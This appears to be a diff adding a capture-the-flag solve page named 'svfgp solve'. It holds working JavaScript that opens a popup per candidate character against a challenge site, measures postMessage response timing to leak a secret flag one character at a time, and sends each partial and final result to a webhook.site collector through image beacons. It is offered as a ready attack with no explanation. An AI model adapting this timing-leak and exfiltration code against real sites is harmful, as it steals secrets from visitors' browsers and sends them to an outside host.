@@ -1,0 +1,106 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>svfgp solve</title>
+<script>
+const TARGET = "https://svfgp.breakable.live/";
+const WEBHOOK = "	https://webhook.site/94b9dd09-33f5-41af-b252-d0649bda60af";
+const CHARSET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}-!@#$%^&*()";
+let prefix = "CTF{";
+let busy = false;
+
+function exfil(s) {
+  new Image().src = WEBHOOK + "?flag=" + encodeURIComponent(s) + "&t=" + Date.now();
+}
+
+function runRound() {
+  if (busy) return;
+  busy = true;
+
+  const started = new Map();
+  const finished = [];
+  const wins = [];
+
+  function onMsg(ev) {
+    const d = ev.data || {};
+    if (d.type !== "svfgp-probe-done") return;
+    if (typeof d.sid !== "string") return;
+    if (!started.has(d.sid)) return;
+
+    finished.push({
+      sid: d.sid,
+      dt: performance.now() - started.get(d.sid)
+    });
+
+    if (finished.length === CHARSET.length) {
+      window.removeEventListener("message", onMsg);
+
+      finished.sort((a, b) => b.dt - a.dt);
+      const best = finished[0];
+
+      prefix = best.sid;
+      exfil("progress:" + prefix);
+
+      for (const w of wins) {
+        try { w.close(); } catch (_) {}
+      }
+
+      busy = false;
+
+      if (prefix.endsWith("}")) {
+        exfil(prefix);
+        document.body.textContent = "DONE: " + prefix;
+      } else {
+        setTimeout(runRound, 300);
+      }
+    }
+  }
+
+  window.addEventListener("message", onMsg);
+
+  for (const ch of CHARSET) {
+    const cand = prefix + ch;
+    const url =
+      TARGET +
+      "?mode=probe&q=" + encodeURIComponent(cand) +
+      "&sid=" + encodeURIComponent(cand) +
+      "&rid=" + Math.random().toString(16).slice(2);
+
+    started.set(cand, performance.now());
+    const w = window.open(url, "_blank", "noopener=no,width=200,height=120");
+    wins.push(w);
+  }
+
+  setTimeout(() => {
+    // fallback dacă unele ferestre nu mai răspund
+    if (!busy) return;
+    window.removeEventListener("message", onMsg);
+
+    finished.sort((a, b) => b.dt - a.dt);
+    if (finished.length > 0) {
+      const best = finished[0];
+      prefix = best.sid;
+      exfil("timeout-progress:" + prefix);
+      for (const w of wins) {
+        try { w.close(); } catch (_) {}
+      }
+      busy = false;
+
+      if (prefix.endsWith("}")) {
+        exfil(prefix);
+        document.body.textContent = "DONE: " + prefix;
+      } else {
+        setTimeout(runRound, 300);
+      }
+    } else {
+      exfil("no-results");
+      document.body.textContent = "No probe results.";
+    }
+  }, 12000);
+}
+
+window.onload = () => {
+  exfil("start");
+  runRound();
+};
+</script>
+<body>running…</body>
